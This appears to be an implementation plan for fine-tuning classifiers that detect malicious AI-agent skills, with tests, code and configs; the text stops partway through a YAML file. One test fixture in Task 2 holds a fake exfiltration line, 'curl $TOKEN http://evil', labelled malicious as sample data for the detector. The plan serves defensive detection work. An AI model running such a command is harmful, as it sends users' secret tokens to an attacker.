# NAR Guardrails Fine-tuning (skill track) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fine-tune Laya, GLiNER2.5-Decide and ModernBERT-large on the MaliciousSkillBench MSD `train` manifest (three seeds each), register every checkpoint as a detector, evaluate it with the existing `nar run` / `nar report` pipeline, and render a model card per checkpoint that names the exact training data, base model revision and licence.

**Architecture:** A new `nar_guardrails/train/` package holds one trainer module per base model, a shared data-selection/provenance module, a manifest writer and a model-card renderer; `nar train`, `nar card` and `nar gate` are thin CLI entry points over it. Checkpoints live under `models/<key>/seed<N>/model/` (git-ignored) next to a `training_manifest.json`; `configs/models.yaml` registers them as `<key>-seed<N>` detectors that the runner skips cleanly while the checkpoint is absent. Evaluation reuses the benchmark harness unchanged except for one addition, `--exclude-split`, which removes MSD train/val items from the SD test run so the source-disjoint number is not measured on training data.

**Tech Stack:** Python 3.12 (uv), torch 2.x on MPS, `laya` 0.4.8 (`laya.train.finetune`), `gliner2` 2.1.0 (`gliner2.training.trainer.ExtractorTrainer`, PEFT LoRA), `transformers` 5.20 (`Trainer`, `ModernBertForSequenceClassification`), `huggingface_hub.snapshot_download` for revision pinning, pytest (offline by default).

**Spec:** `docs/superpowers/specs/2026-10-14-nar-guardrails-lab-design.md` §9 (fine-tuning) — read it alongside this plan; the spec is the authority. User requirements recorded in the ledger `docs/superpowers/ledgers/2026-10-14-nar-guardrails-lab-core.md` also bind: a fine-tuned model in the repo must have a clear training-dataset record and a reference to the original provider's model card; public datasets must be 2025–2026 only (MaliciousSkillBench is 2026-08).

## Global Constraints

- Train on the MSD `train` manifest, choose thresholds on MSD `val`, evaluate on MSD `test` and SD `test`. Three seeds each (seeds 0, 1, 2). Each trainer writes a checkpoint under `models/<key>/seed<N>/` plus a training log, and registers the checkpoint as a detector. (spec §9)
- `laya-ft`: base `convaiinnovations/laya`; single `noul` question, train decision head and encoder, 1–3 epochs, then temperature calibration; 512-token input; the `laya-multi` 8k variant is trained the same way if the 512 cap costs more than 5 recall points on val. (spec §9)
- `gliner2-decide-ft`: base `fastino/GLiNER2.5-Decide`; `ExtractorTrainer` with LoRA, two-label classification task, max length 1,024, 2–3 epochs. (spec §9)
- `modernbert-ft`: base `answerdotai/ModernBERT-large`; `AutoModelForSequenceClassification`, max length 2,048, lr 2e-5, 2 epochs, fp32 on MPS, batch 4 with gradient accumulation. (spec §9)
- `openjev-2b-ft` (optional): base `ZefanCai/Open-Jev-2B`; LoRA rank 8, alpha 16, attention projections plus head, 1 epoch, max length 4,096; run on MPS if the base model's smoke test passes; otherwise a Kaggle T4 notebook built from the same script. (spec §9 — the Kaggle path is withdrawn by the local-only ruling below)
- Fallbacks: if MPS training fails for a model, retry on CPU with a reduced max length; if still infeasible, reduce epochs or seeds and record it, or record the model as not trained. The spec's cloud-GPU fallback and the Kaggle notebook path are withdrawn (user ruling, 2026-10-21).
- **Local by default (user rulings, 2026-10-21).** Training and data code never call an external API: no Hugging Face Hub API lookups, no cloud compute. Base weights are fetched once, as files, by `nar fetch-bases` into the local Hub cache; `nar train` and the `finetune-probe`, `finetune` and `bench-ft` targets run with `HF_HUB_OFFLINE=1` and resolve bases with `local_files_only=True`. The Claude comparison stays in the lab ("using claude stays"): the `claude-*` detectors are the only API-backed components, they run only when the user has exported `ANTHROPIC_API_KEY`, and they are skipped with a reason otherwise. `--detectors local` (everything except the `claude` adapter) exists for runs that must not touch the API even with a key present.
- Detector keys for seeds are `<key>-seed<N>` — `nar_guardrails/report/tables.py::split_seed` already parses this form and the report's seed-aggregated table depends on it.
- Fine-tuned detectors run on the `skills` track only (`tracks: [skills]`).
- Every checkpoint ships `training_manifest.json` and `MODEL_CARD.md` with: base model id, Hub revision, licence and link to the original model card; the exact training split (benchmark name and Hub revision, item id list file, sha256 of the id list and of the items file); hyperparameters; seed; policy text and hash; metrics at frozen thresholds; hardware and package versions.
- The training question and label descriptions baked into Laya and GLiNER2 training are the `shared` skills policy (`configs/policies/skills/shared.yaml`), exactly as `LayaDetector.build_questions` and `GLiNER2Detector.build_schema` render them at inference. Train/infer text must match byte for byte.
- Default `pytest` runs offline (`addopts = "-m 'not model and not live'"`); any test that downloads or trains a real model is marked `@pytest.mark.model`.
- Weights are never committed (`models/` is git-ignored). Committed: `configs/finetune.yaml`, `docs/model-cards/*.md`, `docs/model-cards/training-set-MSD-train.json`.
- Text truncation for training uses the head of the text (first N tokens), the same cut the adapters apply at inference.
- Do not start a training job while `make bench` is running (both use the single MPS device). Check `grep -c EXIT= results/bench.log` first.

## Review Focus

1. **Leakage** — a training set that overlaps MSD val/test or an SD test run that scores items the model trained on silently inflates every number. Task 1 pins `assert_disjoint`; Task 2 pins `--exclude-split` in both the runner and the report.
2. **Empty or whitespace skill text** — Laya's `items_from_rows` drops `empty_text` rows and the harness scores `"(empty)"` at inference; trainers must substitute `"(empty)"` so the training and inference inputs agree (Tasks 4–6 tests).
3. **Missing checkpoint** — before any training exists, `make bench` must still complete: a `*-ft-seed*` detector whose directory is absent is `skipped` with a reason naming the `nar train` command, never a crash (Task 3 test).
4. **Oversized text** — one MaliciousSkillBench item is 100,000 characters after the load-time cap; a trainer that tokenises without truncation can exhaust memory on MPS. Every trainer cuts to its token budget before batching (Task 1 `truncate_tokens` test; Tasks 4–6 assert the budget).
5. **Train/infer text drift** — if the policy YAML changes after training, the checkpoint's baked-in question no longer matches the detector's question. The manifest records the policy hash and `nar card` prints the policy text, so a reviewer can see the mismatch (Task 8 test asserts the hash and text appear in the card).

## File structure

| Path | Responsibility |
|---|---|
| `nar_guardrails/train/__init__.py` | package marker |
| `nar_guardrails/train/data.py` | split selection, leakage guard, balanced `--limit` subsample, training-set provenance record, token-budget truncation |
| `nar_guardrails/train/manifest.py` | `training_manifest.json` read/write, timestamps |
| `nar_guardrails/train/laya_ft.py` | Laya rows (`{state, questions, expected}`) and `train_laya` over `laya.train.finetune` |
| `nar_guardrails/train/gliner2_ft.py` | GLiNER2 `InputExample`s with label descriptions and `train_gliner2_decide` over `ExtractorTrainer` + LoRA |
| `nar_guardrails/train/modernbert_ft.py` | tokenised datasets and `train_modernbert` over `transformers.Trainer` |
| `nar_guardrails/train/run.py` | `nar train` orchestration: config, base-revision resolution, data, trainer dispatch, manifest + ids file |
| `nar_guardrails/train/card.py` | model-card rendering from manifest + benchmark run outputs |
| `nar_guardrails/train/gates.py` | Laya 512-token length gate |
| `nar_guardrails/detectors/base.py` | `MANIFEST_NAME`, `checkpoint_revision`, `require_local_checkpoint` |
| `nar_guardrails/detectors/{laya_adapter,gliner2_adapter,hf_classifier}.py` | honour `finetuned: true`, record `ft:` revisions |
| `nar_guardrails/bench/runner.py`, `nar_guardrails/report/build.py`, `nar_guardrails/cli.py` | `--exclude-split`; `nar train`, `nar card`, `nar gate` |
| `configs/finetune.yaml` | per-model recipe: base id, pinned revision, card URL, licence, hyperparameters |
| `configs/models.yaml` | nine `*-ft-seed<N>` detector entries |
| `Makefile` | `finetune-probe`, `finetune`, `bench-ft`, `publish-results` |
| `docs/model-cards/README.md` | card convention; generated cards and the training-set ids file live here |
| `tests/test_train_data.py`, `tests/test_train_manifest.py`, `tests/test_laya_ft.py`, `tests/test_gliner2_ft.py`, `tests/test_modernbert_ft.py`, `tests/test_train_run.py`, `tests/test_card.py`, `tests/test_gates.py` + additions to `tests/test_runner.py`, `tests/test_report_build.py`, `tests/test_cli.py`, `tests/test_detector_base.py`, `tests/test_laya_adapter.py`, `tests/test_gliner2_adapter.py`, `tests/test_hf_classifier.py`, `tests/test_models_yaml.py` | tests |

Dataset facts the tasks rely on (from `data/processed/skills.build.json`, 2026-10-21): MSD train 6,818 items (5,254 malicious / 1,564 benign), MSD val 974, MSD test 2,051 (incl. 54 curated + 49 SkillSpector fixtures); SD test 1,487 of which 1,099 are in MSD train and 90 in MSD val, leaving 298 held-out items (141 malicious / 157 benign). Text length p99 ≈ 28k characters, max 100k. MaliciousSkillBench Hub revision at planning time `d4b42ce5766a6e0359c987cf59c1007cb3795a90`, licence CC-BY-4.0.

---

### Task 1: Training data selection and provenance (`nar_guardrails/train/data.py`)

**Files:**
- Create: `nar_guardrails/train/__init__.py`
- Create: `nar_guardrails/train/data.py`
- Test: `tests/test_train_data.py`

**Interfaces:**
- Consumes: `nar_guardrails.schema.Item` (fields `id, track, text, label, scenario, source, split, variant, meta`; `meta["splits"] == {"MSD": ..., "SD": ...}`, `meta["license"]`), `nar_guardrails.bench.manifest.file_sha256(path) -> str | None`.
- Produces: `select_split(items, protocol, split, variant="text") -> list[Item]`, `assert_disjoint(train, *held_out) -> None`, `limit_items(items, limit, seed) -> list[Item]`, `ids_sha256(items) -> str`, `training_set_record(items, items_path, protocol, split, benchmark) -> dict`, `truncate_tokens(tok, text, max_tokens) -> str`, constant `EMPTY_TEXT = "(empty)"`.

- [ ] **Step 1: Write the failing tests**

`tests/test_train_data.py`:

```python
from pathlib import Path

import pytest

from nar_guardrails.schema import Item
from nar_guardrails.train.data import (EMPTY_TEXT, assert_disjoint, ids_sha256, limit_items, select_split,
                                       training_set_record, truncate_tokens)


def _item(n, label, msd, sd="train", variant="text"):
    return Item(id=f"msb:{n:04d}", track="skills", text=f"skill {n}", label=label, source="malicious_skill_bench",
                split=msd, variant=variant, meta={"splits": {"MSD": msd, "SD": sd}, "license": "CC-BY-4.0"})


ITEMS = [_item(2, 0, "train"), _item(1, 1, "train"), _item(3, 1, "val"), _item(4, 0, "test"),
         _item(5, 1, "train", variant="text+scripts")]


def test_select_split_filters_protocol_split_and_variant_sorted():
    assert [i.id for i in select_split(ITEMS, "MSD", "train")] == ["msb:0001", "msb:0002"]
    assert [i.id for i in select_split(ITEMS, "SD", "train")] == ["msb:0001", "msb:0002", "msb:0003", "msb:0004"]
    assert select_split(ITEMS, "MSD", "train", variant="text+scripts") == [ITEMS[4]]


def test_assert_disjoint_raises_on_leak_and_passes_when_clean():
    train = select_split(ITEMS, "MSD", "train")
    with pytest.raises(ValueError, match="1 training items"):
        assert_disjoint(train, [ITEMS[1]])
    assert_disjoint(train, select_split(ITEMS, "MSD", "val"), select_split(ITEMS, "MSD", "test"))


def test_limit_items_is_balanced_sorted_and_deterministic():
    many = [_item(n, n % 2, "train") for n in range(40)]
    a, b = limit_items(many, 10, seed=1), limit_items(many, 10, seed=1)
    assert a == b and len(a) == 10 and sum(i.label for i in a) == 5
    assert [i.id for i in a] == sorted(i.id for i in a)
    assert limit_items(many, 10, seed=2) != a
    assert limit_items(many, None, 0) == many
    with pytest.raises(ValueError):
        limit_items(many, 1, 0)


def test_training_set_record_names_data_exactly(tmp_path: Path):
    p = tmp_path / "skills.jsonl"
    p.write_text("x\n", encoding="utf-8")
    train = select_split(ITEMS, "MSD", "train")
    rec = training_set_record(train, p, "MSD", "train", {"dataset": "d", "revision": "r"})
    assert rec["protocol"] == "MSD" and rec["split"] == "train"
    assert rec["n_items"] == 2 and rec["n_malicious"] == 1 and rec["n_benign"] == 1
    assert rec["ids"] == ["msb:0001", "msb:0002"] and rec["ids_sha256"] == ids_sha256(train)
    assert rec["sources"] == {"malicious_skill_bench": 2} and rec["licenses"] == {"CC-BY-4.0": 2}
    assert rec["items_file"] == str(p) and len(rec["items_sha256"]) == 64
    assert rec["benchmark"] == {"dataset": "d", "revision": "r"}


class WordTok:
    def encode(self, text, add_special_tokens=False):
        return text.split()

    def decode(self, ids):
        return " ".join(ids)


def test_truncate_tokens_keeps_head_and_replaces_empty():
    tok = WordTok()
    assert truncate_tokens(tok, "a b c d e", 3) == "a b c"
    assert truncate_tokens(tok, "a b", 3) == "a b"
    assert truncate_tokens(tok, "   ", 3) == EMPTY_TEXT == "(empty)"
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_train_data.py -q`
Expected: FAIL with `ModuleNotFoundError: No module named 'nar_guardrails.train'`

- [ ] **Step 3: Write the implementation**

`nar_guardrails/train/__init__.py`:

```python
"""Fine-tuning of the skill-track NAR models (spec §9): data selection, trainers, manifests, model cards."""
```

`nar_guardrails/train/data.py`:

```python
"""Training-set selection and provenance for the skill-track fine-tunes (spec §9)."""
from __future__ import annotations

import hashlib
import random
from collections import Counter
from pathlib import Path

from nar_guardrails.bench.manifest import file_sha256
from nar_guardrails.schema import Item

EMPTY_TEXT = "(empty)"  # what the detectors score for blank text; training must see the same string


def select_split(items: list[Item], protocol: str, split: str, variant: str = "text") -> list[Item]:
    """Items whose `meta.splits[protocol] == split`, one variant only, sorted by id."""
    out = [i for i in items if i.variant == variant and (i.meta.get("splits") or {}).get(protocol) == split]
    out.sort(key=lambda i: i.id)
    return out


def assert_disjoint(train: list[Item], *held_out: list[Item]) -> None:
    """Raise if any training id appears in a held-out split. Runs before every training job."""
    ids = {i.id for i in train}
    for group in held_out:
        leaked = sorted(ids & {i.id for i in group})
        if leaked:
            raise ValueError(f"{len(leaked)} training items also appear in a held-out split, e.g. {leaked[:3]}")


def limit_items(items: list[Item], limit: int | None, seed: int) -> list[Item]:
    """Deterministic class-balanced subsample for smoke runs; `None` returns the items unchanged."""
    if limit is None:
        return list(items)
    if limit < 2:
        raise ValueError("limit must be at least 2 so both classes are present")
    rng = random.Random(seed)
    pos = [i for i in items if i.label == 1]
    neg = [i for i in items if i.label == 0]
    rng.shuffle(pos)
    rng.shuffle(neg)
    half = limit // 2
    chosen = pos[:half] + neg[:limit - half]
    chosen.sort(key=lambda i: i.id)
    return chosen


def ids_sha256(items: list[Item]) -> str:
    return hashlib.sha256("\n".join(i.id for i in items).encode("utf-8")).hexdigest()


def training_set_record(items: list[Item], items_path: Path, protocol: str, split: str, benchmark: dict) -> dict:
    """Everything a model card needs to name the training data exactly (the id list included)."""
    return {
        "protocol": protocol, "split": split, "n_items": len(items),
        "n_malicious": sum(i.label == 1 for i in items), "n_benign": sum(i.label == 0 for i in items),
        "items_file": str(items_path), "items_sha256": file_sha256(Path(items_path)),
        "ids_sha256": ids_sha256(items),
        "sources": dict(sorted(Counter(i.source for i in items).items())),
        "licenses": dict(sorted(Counter(str(i.meta.get("license")) for i in items).items())),
        "benchmark": benchmark,
        "ids": [i.id for i in items],
    }


def truncate_tokens(tok, text: str, max_tokens: int) -> str:
    """Head of `text` that fits `max_tokens` tokenizer tokens (no special tokens). Blank text becomes EMPTY_TEXT."""
    text = text if text.strip() else EMPTY_TEXT
    ids = tok.encode(text, add_special_tokens=False)
    if len(ids) <= max_tokens:
        return text
    return tok.decode(ids[:max_tokens])
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `uv run pytest tests/test_train_data.py -q`
Expected: 5 passed

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/__init__.py nar_guardrails/train/data.py tests/test_train_data.py
git commit -m "feat(train): split selection, leakage guard and training-set provenance record"
```

---

### Task 2: `--exclude-split` for held-out SD evaluation (runner, report, CLI)

**Files:**
- Modify: `nar_guardrails/bench/runner.py` (`RunConfig`, `load_items`, `run`)
- Modify: `nar_guardrails/report/build.py:68-75` (`_items_for`) and the notes in `build_report`
- Modify: `nar_guardrails/cli.py` (`run` subparser and dispatch)
- Test: `tests/test_runner.py`, `tests/test_report_build.py`, `tests/test_cli.py`

**Interfaces:**
- Consumes: `Item.meta["splits"]`, the existing `load_items(data_dir, track, split, protocol=None, limit=None, variant="text")`, run manifest written in `run()` (dict with `run_id, track, split, protocol, variant, ...`).
- Produces: `parse_exclude(specs: list[str] | None) -> tuple[tuple[str, str], ...]`, `apply_exclude(items, exclude) -> list[Item]`, `load_items(..., exclude=())`, `RunConfig.exclude: tuple[tuple[str, str], ...] = ()`, manifest key `"exclude": ["MSD:train", ...]`, CLI flag `--exclude-split PROTOCOL:SPLIT` (repeatable); `resolve_detectors` accepts the spec `local` (every detector listing the track except the `fake` and `claude` adapters).

Why: SD `test` shares 1,189 of its 1,487 items with MSD train/val. A model trained on MSD train must only be scored on the 298 SD-test items outside MSD train/val. Zero-shot detectors are scored on the same 298 items in that run (their verdicts come from the cache), so the comparison stays fair.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_runner.py` (reuse the file's existing helpers for writing items if it has them; otherwise this is self-contained):

```python
def test_load_items_exclude_split_and_parse(tmp_path):
    from nar_guardrails.bench.runner import apply_exclude, load_items, parse_exclude
    from nar_guardrails.schema import Item, write_jsonl
    rows = [Item(id="a", track="skills", text="x", label=1, split="test", meta={"splits": {"SD": "test", "MSD": "train"}}),
            Item(id="b", track="skills", text="y", label=0, split="test", meta={"splits": {"SD": "test", "MSD": "val"}}),
            Item(id="c", track="skills", text="z", label=1, split="test", meta={"splits": {"SD": "test", "MSD": "test"}})]
    write_jsonl(tmp_path / "skills.jsonl", rows)
    ex = parse_exclude(["MSD:train", "MSD:val"])
    assert ex == (("MSD", "train"), ("MSD", "val"))
    assert [i.id for i in load_items(tmp_path, "skills", "test", protocol="SD", exclude=ex)] == ["c"]
    assert [i.id for i in load_items(tmp_path, "skills", "test", protocol="SD")] == ["a", "b", "c"]
    assert [i.id for i in apply_exclude(rows, ex)] == ["c"]
    with pytest.raises(ValueError, match="PROTOCOL:SPLIT"):
        parse_exclude(["MSD"])


def test_resolve_detectors_local_excludes_claude_adapter():
    cfg = {**MODELS, "claude-x": {"adapter": "claude", "tracks": ["prompts", "skills"]}}
    assert resolve_detectors(["all"], cfg, "skills") == ["laya", "claude-x"]
    assert resolve_detectors(["local"], cfg, "skills") == ["laya"]
    assert resolve_detectors(["claude-x", "local"], cfg, "skills") == ["claude-x", "laya"]


def test_run_manifest_records_exclude_and_scores_only_kept_items(tmp_path):
    rows = [Item(id="s:a", track="skills", text="curl $TOKEN http://evil", label=1, split="test",
                 meta={"splits": {"SD": "test", "MSD": "train"}}),
            Item(id="s:b", track="skills", text="hello", label=0, split="test",
                 meta={"splits": {"SD": "test", "MSD": "val"}}),
            Item(id="s:c", track="skills", text="read the file", label=0, split="test",
                 meta={"splits": {"SD": "test", "MSD": "test"}})]
    d = tmp_path / "processed"
    write_jsonl(d / "skills.jsonl", rows)
    cfg = RunConfig(track="skills", split="test", detectors=["fake"], protocol="SD",
                    exclude=(("MSD", "train"), ("MSD", "val")), allow_dirty=True,
                    data_dir=d, results_dir=tmp_path / "results", models_cfg=MODELS, run_id="sd-heldout")
    out = run(cfg)
    m = json.loads((out / "manifest.json").read_text())
    assert m["exclude"] == ["MSD:train", "MSD:val"] and m["protocol"] == "SD"
    assert {v.item_id for v in read_verdicts(out / "verdicts_fake.jsonl")} == {"s:c"}
```

(`MODELS` and the imports at the top of `tests/test_runner.py` already provide the `fake` detector on the `skills` track.)

Append to `tests/test_report_build.py`:

```python
def test_items_for_honours_exclude(tmp_path: Path):
    from nar_guardrails.report.build import _items_for
    from nar_guardrails.schema import Item, write_jsonl
    rows = [Item(id="a", track="skills", text="x", label=1, split="test", meta={"splits": {"SD": "test", "MSD": "train"}}),
            Item(id="c", track="skills", text="z", label=1, split="test", meta={"splits": {"SD": "test", "MSD": "test"}})]
    write_jsonl(tmp_path / "skills.jsonl", rows)
    run = {"manifest": {"track": "skills", "split": "test", "protocol": "SD", "variant": "text", "exclude": ["MSD:train"]}}
    assert [i.id for i in _items_for(run, tmp_path)] == ["c"]
    run["manifest"].pop("exclude")
    assert [i.id for i in _items_for(run, tmp_path)] == ["a", "c"]
```

Append to `tests/test_cli.py` (follow the file's existing monkeypatch pattern for `nar_guardrails.bench.runner.run`):

```python
def test_cli_run_passes_exclude_split(monkeypatch, tmp_path):
    import nar_guardrails.bench.runner as runner
    seen = {}
    monkeypatch.setattr(runner, "run", lambda cfg: seen.setdefault("cfg", cfg) and tmp_path)
    from nar_guardrails.cli import main
    assert main(["run", "--track", "skills", "--split", "test", "--protocol", "SD", "--detectors", "fake",
                 "--exclude-split", "MSD:train", "--exclude-split", "MSD:val"]) == 0
    assert seen["cfg"].exclude == (("MSD", "train"), ("MSD", "val"))
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_runner.py -k exclude tests/test_report_build.py -k exclude tests/test_cli.py -k exclude -q`
Expected: FAIL with `ImportError: cannot import name 'parse_exclude'` / `TypeError: unexpected keyword argument 'exclude'`

- [ ] **Step 3: Implement**

In `nar_guardrails/bench/runner.py`:

```python
def parse_exclude(specs: list[str] | None) -> tuple[tuple[str, str], ...]:
    """'MSD:train' -> ('MSD', 'train'). Anything else is a ValueError."""
    out: list[tuple[str, str]] = []
    for s in specs or []:
        proto, sep, split = s.partition(":")
        if not sep or not proto or not split:
            raise ValueError(f"--exclude-split expects PROTOCOL:SPLIT, got {s!r}")
        out.append((proto, split))
    return tuple(out)


def apply_exclude(items: list[Item], exclude: tuple[tuple[str, str], ...]) -> list[Item]:
    """Drop items that sit in any excluded (protocol, split); used so an SD test run never scores MSD training items."""
    return [i for i in items if not any((i.meta.get("splits") or {}).get(p) == s for p, s in exclude)]
```

- In `resolve_detectors`, add a branch before `elif k in models_cfg:`: `elif k == "local": names = [n for n, c in models_cfg.items() if n != "fake" and track in c.get("tracks", []) and c.get("adapter") != "claude"]`, and extend the docstring: "'local' is 'all' minus the claude adapter (never calls an API)".
- Add `exclude: tuple[tuple[str, str], ...] = ()` to `RunConfig`.
- `load_items(..., variant="text", exclude=())`: after the protocol/split filter and before the sort, `items = apply_exclude(items, exclude)`.
- In `run()`: pass `cfg.exclude` to `load_items`; add `"exclude": [f"{p}:{s}" for p, s in cfg.exclude]` to the manifest dict next to `"protocol"`.

In `nar_guardrails/report/build.py`:

```python
def _items_for(run: dict, data_dir: Path):
    from nar_guardrails.bench.runner import apply_exclude, parse_exclude
    m = run["manifest"]
    variant = _variant(m)
    items = [i for i in read_items(Path(data_dir) / f"{m['track']}.jsonl") if i.variant == variant]
    if m.get("protocol"):
        items = [i for i in items if i.meta.get("splits", {}).get(m["protocol"]) == m["split"]]
    else:
        items = [i for i in items if i.split == m["split"]]
    return apply_exclude(items, parse_exclude(m.get("exclude")))
```

and in `build_report`, after the thresholds note: `if m.get("exclude"): notes.append(f"Items in {', '.join(m['exclude'])} were excluded from this run ({len(items)} items scored).")`.

In `nar_guardrails/cli.py`: `r.add_argument("--exclude-split", action="append", default=[], metavar="PROTOCOL:SPLIT", help="skills only: drop items that sit in this protocol split (repeatable), e.g. MSD:train")` and in the `run` branch `from nar_guardrails.bench.runner import RunConfig, parse_exclude, run` with `exclude=parse_exclude(args.exclude_split)` in the `RunConfig(...)` call.

- [ ] **Step 4: Run the whole suite**

Run: `uv run pytest -q`
Expected: all pass (previous count + 4)

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/bench/runner.py nar_guardrails/report/build.py nar_guardrails/cli.py tests/test_runner.py tests/test_report_build.py tests/test_cli.py
git commit -m "feat(bench): --exclude-split so SD test can be scored on items outside MSD train/val"
```

---

### Task 3: Fine-tune config, training manifest, checkpoint-aware adapters, detector registration

**Files:**
- Create: `configs/finetune.yaml`
- Create: `nar_guardrails/train/manifest.py`
- Modify: `nar_guardrails/detectors/base.py` (add `MANIFEST_NAME`, `checkpoint_revision`, `require_local_checkpoint`)
- Modify: `nar_guardrails/detectors/laya_adapter.py`, `nar_guardrails/detectors/gliner2_adapter.py`, `nar_guardrails/detectors/hf_classifier.py`
- Modify: `configs/models.yaml` (nine entries)
- Test: `tests/test_train_manifest.py`, `tests/test_detector_base.py`, `tests/test_laya_adapter.py`, `tests/test_gliner2_adapter.py`, `tests/test_hf_classifier.py`, `tests/test_models_yaml.py`

**Interfaces:**
- Consumes: `DetectorUnavailable`, `hf_revision` (base.py), `split_seed` (`nar_guardrails/report/tables.py`).
- Produces: `MANIFEST_NAME = "training_manifest.json"`, `checkpoint_revision(model_path) -> str | None` (`"ft:" + sha256(manifest bytes)[:12]`, looks in the dir and its parent), `require_local_checkpoint(cfg) -> Path`, `write_training_manifest(seed_dir, manifest) -> Path`, `read_training_manifest(seed_dir) -> dict`, `now_iso() -> str`, `configs/finetune.yaml` schema below, detector keys `laya-ft-seed{0,1,2}`, `gliner2-decide-ft-seed{0,1,2}`, `modernbert-ft-seed{0,1,2}` with `model_id: models/<key>/seed<N>/model` and `finetuned: true`.

- [ ] **Step 1: Write the failing tests**

`tests/test_train_manifest.py`:

```python
import json
from pathlib import Path

from nar_guardrails.detectors.base import MANIFEST_NAME, checkpoint_revision
from nar_guardrails.train.manifest import now_iso, read_training_manifest, write_training_manifest


def test_write_read_roundtrip_and_revision(tmp_path: Path):
    seed_dir = tmp_path / "laya-ft" / "seed0"
    path = write_training_manifest(seed_dir, {"key": "laya-ft", "seed": 0, "when": Path("x")})
    assert path == seed_dir / MANIFEST_NAME and json.loads(path.read_text())["when"] == "x"
    assert read_training_manifest(seed_dir)["key"] == "laya-ft"
    rev = checkpoint_revision(seed_dir / "model")       # manifest sits in the parent of the model dir
    assert rev == checkpoint_revision(seed_dir) and rev.startswith("ft:") and len(rev) == 15
    assert checkpoint_revision(tmp_path / "nowhere") is None
    assert now_iso().endswith("+00:00")
```

Append to `tests/test_detector_base.py`:

```python
def test_require_local_checkpoint(tmp_path):
    from nar_guardrails.detectors.base import DetectorUnavailable, require_local_checkpoint
    (tmp_path / "model").mkdir()
    assert require_local_checkpoint({"model_id": str(tmp_path / "model")}) == tmp_path / "model"
    with pytest.raises(DetectorUnavailable, match=r"nar train --model laya-ft --seed 2"):
        require_local_checkpoint({"model_id": "models/laya-ft/seed2/model"})
    with pytest.raises(DetectorUnavailable, match="not found"):
        require_local_checkpoint({"model_id": str(tmp_path / "missing")})
```

Append to `tests/test_laya_adapter.py`, `tests/test_gliner2_adapter.py`, `tests/test_hf_classifier.py` (one each, same shape):

```python
def test_finetuned_detector_without_checkpoint_is_unavailable(tmp_path):
    from nar_guardrails.detectors.base import DetectorUnavailable
    with pytest.raises(DetectorUnavailable):
        LayaDetector({"finetuned": True, "model_id": str(tmp_path / "missing"), "batch_size": 1}, POL)
```

(for gliner2: `GLiNER2Detector({"finetuned": True, "mode": "decide", "model_id": ...}, POL)`; for hf: `HFClassifier({"finetuned": True, "model_id": ..., "positive_label": "malicious"}, POL)` — the constructor must raise before touching torch/transformers/laya/gliner2 so the test is fast and offline.)

`tests/test_models_yaml.py`:

```python
import yaml

from nar_guardrails.report.tables import split_seed

BASES = {"laya-ft": "laya", "gliner2-decide-ft": "gliner2", "modernbert-ft": "hf_classifier"}


def test_finetuned_detectors_are_registered_per_seed():
    cfg = yaml.safe_load(open("configs/models.yaml", encoding="utf-8"))["detectors"]
    for base, adapter in BASES.items():
        for seed in (0, 1, 2):
            key = f"{base}-seed{seed}"
            assert key in cfg, key
            d = cfg[key]
            assert split_seed(key) == (base, seed)
            assert d["adapter"] == adapter and d["finetuned"] is True and d["tracks"] == ["skills"]
            assert d["model_id"] == f"models/{base}/seed{seed}/model"
    assert cfg["modernbert-ft-seed0"]["positive_label"] == "malicious" and cfg["modernbert-ft-seed0"]["max_length"] == 2048
    assert cfg["gliner2-decide-ft-seed0"]["mode"] == "decide"


def test_finetune_yaml_pins_every_base():
    ft = yaml.safe_load(open("configs/finetune.yaml", encoding="utf-8"))
    assert ft["protocol"] == "MSD" and ft["train_split"] == "train" and ft["val_split"] == "val" and ft["seeds"] == [0, 1, 2]
    for key in ("laya-ft", "laya-multi-ft", "gliner2-decide-ft", "modernbert-ft"):
        m = ft["models"][key]
        assert len(m["base_revision"]) == 40 and m["base_card"].startswith("https://huggingface.co/")
        assert m["base_license"] == "apache-2.0" and m["trainer"] in ("laya", "gliner2", "modernbert")
        assert isinstance(m["max_tokens"], int) and isinstance(m["epochs"], int)
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_train_manifest.py tests/test_detector_base.py tests/test_models_yaml.py tests/test_laya_adapter.py tests/test_gliner2_adapter.py tests/test_hf_classifier.py -q`
Expected: FAIL (ImportError for `MANIFEST_NAME`, missing YAML keys, no `DetectorUnavailable` raised)

- [ ] **Step 3: Implement**

`configs/finetune.yaml`:

```yaml
# Fine-tuning recipes for the skill track (spec §9). `nar train --model <key> --seed <n>` reads this file.
# Revisions are the Hub commits resolved on 2026-10-21; they are what the training manifest and model card cite.
protocol: MSD
train_split: train
val_split: val
seeds: [0, 1, 2]
policy: shared                 # configs/policies/skills/shared.yaml, rendered exactly as the adapters render it
weights_license: apache-2.0    # licence of the released fine-tuned weights (every base is Apache-2.0)
models:
  laya-ft:
    trainer: laya
    base_model: convaiinnovations/laya
    base_revision: 7b928d828b7b0e022f929d9bd2e44165aa270148
    base_card: https://huggingface.co/convaiinnovations/laya
    base_license: apache-2.0
    max_tokens: 512
    epochs: 3
    micro_batch: 8
    grad_accum: 8              # effective batch 64, the published notebook's
    encoder_lr: 0.000025
    head_lr: 0.0001
    loss: rlcd
    calib_frac: 0.1            # laya.train.finetune holds this slice of train out for temperature calibration
    calib_max: 400
    gradient_checkpointing: true
  laya-multi-ft:               # trained only if `nar gate` shows the 512-token cap costs > 5 recall points on val
    trainer: laya
    base_model: convaiinnovations/laya-multilingual
    base_revision: 1720e3e3357cfe1e281542e223f8273b0890ca34
    base_card: https://huggingface.co/convaiinnovations/laya-multilingual
    base_license: apache-2.0
    max_tokens: 8192
    epochs: 3
    micro_batch: 1
    grad_accum: 64
    encoder_lr: 0.000025
    head_lr: 0.0001
    loss: rlcd
    calib_frac: 0.1
    calib_max: 400
    gradient_checkpointing: true
  gliner2-decide-ft:
    trainer: gliner2
    base_model: fastino/GLiNER2.5-Decide
    base_revision: 9d1bfb848cd16d93ee56ccbc59cd92bf0f284d90
    base_card: https://huggingface.co/fastino/GLiNER2.5-Decide
    base_license: apache-2.0
    max_tokens: 1024
